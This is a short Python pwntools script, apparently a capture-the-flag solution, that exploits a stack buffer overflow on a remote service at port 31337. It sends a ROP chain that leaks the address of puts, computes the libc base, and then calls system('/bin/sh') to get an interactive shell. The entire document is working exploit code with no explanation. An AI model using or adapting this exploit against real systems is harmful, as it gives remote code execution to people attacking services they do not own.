from pwn import *


puts_plt=0x0000000000401030
puts_got=0x404018
pop_rdi_ret=0x004011eb
main=0x0000000000401142



payload=b"A"*120
payload+=p64(pop_rdi_ret)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(main)



p=remote("hjaducen.at-tech.xyz",31337)
p.recvline()
p.recvline()
p.sendline(payload)
leak=p.recvline()[:-1]
leak=leak+b"\x00\x00"
leak=u64(leak)
log.info("puts address is "+hex(leak))

libc_base=leak-0x6f6a0
system=libc_base+0x453a0
binsh=libc_base+0x18ce17

payload=b"A"*120
payload+=p64(pop_rdi_ret)
payload+=p64(binsh)
payload+=p64(system)

p.sendline(payload)
p.interactive()
